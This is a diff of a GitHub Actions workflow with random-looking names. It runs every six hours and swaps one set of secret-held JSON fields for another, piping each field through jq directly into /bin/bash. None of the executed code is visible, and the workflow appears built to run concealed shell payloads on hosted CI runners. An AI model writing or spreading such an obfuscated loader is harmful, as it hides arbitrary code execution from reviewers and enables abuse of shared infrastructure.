@@ -3,29 +3,24 @@ name: yanxiaorou4187
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 0/6 * * *'
+    - cron: '42 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanxiaorou4187
         env:
-          ql53108: ${{ secrets.ql53108 }}
+          vdc302: ${{ secrets.vdc302 }}
         run: |
-          echo $ql53108 | jq -r .w78 | /bin/bash
-          echo $iayhq28621 | jq -r .hyq7221 | /bin/bash
-          echo $jinjt191 | jq -r .spsx032 | /bin/bash
-          echo $pho765 | jq -r .g1084 | /bin/bash
-          echo $h71005 | jq -r .rjhfa58 | /bin/bash
-          echo $w64213 | jq -r .udp72 | /bin/bash
-          echo $ital585 | jq -r .asg555 | /bin/bash
-          echo $j71353 | jq -r .o998 | /bin/bash
-          echo $ovhu6812 | jq -r .kngyc33250 | /bin/bash
-          echo $fiiij3 | jq -r .rkk1 | /bin/bash
-          echo $vd660 | jq -r .hplou0 | /bin/bash
-          echo $szs19 | jq -r .u5150 | /bin/bash
-          echo $lmho05 | jq -r .ipxo8800 | /bin/bash
-          echo $yxeq230 | jq -r .hon08323 | /bin/bash
+          echo $vdc302 | jq -r .rrd5 | /bin/bash
+          echo $wf2565 | jq -r .r5 | /bin/bash
+          echo $v559 | jq -r .up733 | /bin/bash
+          echo $qwbv581 | jq -r .jmqwe34 | /bin/bash
+          echo $rp6 | jq -r .xq88 | /bin/bash
+          echo $ezocp5 | jq -r .m187 | /bin/bash
+          echo $whe750 | jq -r .xvup391 | /bin/bash
+          echo $wr537 | jq -r .zg194 | /bin/bash
 
